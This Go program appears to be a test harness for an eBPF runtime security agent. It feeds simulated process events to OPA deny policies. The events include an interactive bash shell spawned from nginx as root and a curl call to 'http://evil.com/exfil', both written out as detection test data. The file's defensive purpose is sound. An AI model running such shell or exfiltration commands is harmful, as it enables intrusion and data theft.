package main

import (
    "fmt"
    "log"

    "github.com/karandesai2005/ebpf-agent/internal/opa"
)

func main() {
    // Load OPA engine
    engine, err := opa.NewEngine("./policies")
    if err != nil {
        log.Fatalf("failed to load OPA: %v", err)
    }
    fmt.Println("OPA engine loaded")

    // Simulate a malicious event — shell spawned inside nginx container
    testEvent := map[string]interface{}{
        "type": "process_exec",
        "process": map[string]interface{}{
            "binary":      "/bin/bash",
            //"binary": "/usr/sbin/nginx", not mallacious 
            "arguments":   "-i",
            "parent_name": "nginx",//Loads all .rego files from your policies folder, 
            //"parent_name": "systemd",
            "pid":         float64(1234),
            "uid":         float64(0),
        },
        "container": map[string]interface{}{
            "namespace": "production",
            "pod_name":  "nginx-pod-abc123",
            "name":      "nginx",
        },
    }
    testEvent2 := map[string]interface{}{
    "type": "process_exec",
    "process": map[string]interface{}{
        "binary":      "/usr/bin/curl",
        "arguments":   "http://evil.com/exfil",
        "parent_name": "node",
        "pid":         float64(9012),
        "uid":         float64(1000),
    },
    "container": map[string]interface{}{
        "namespace": "production",
        "pod_name":  "api-pod-xyz",
        "name":      "api-server",
    },
}

    results2, err := engine.Evaluate("agent.process.deny", testEvent2)
    if err != nil {
        log.Fatalf("OPA evaluation failed: %v", err)
    }

    if len(results2) > 0 {
        fmt.Println("\n🚨 ALERT FIRED:")
        for _, msg := range results2 {
            fmt.Printf("  → %s\n", msg)
        }
    } else {
        fmt.Println("✅ Clean")
    }

    results, err := engine.Evaluate("agent.process.deny", testEvent)
    if err != nil {
        log.Fatalf("OPA evaluation failed: %v", err)
    }

    if len(results) > 0 {
        fmt.Println("\n🚨 ALERT FIRED:")
        for _, msg := range results {
            fmt.Printf("  → %s\n", msg)
        }
    } else {
        fmt.Println("✅ Clean — no rules triggered")
    }
}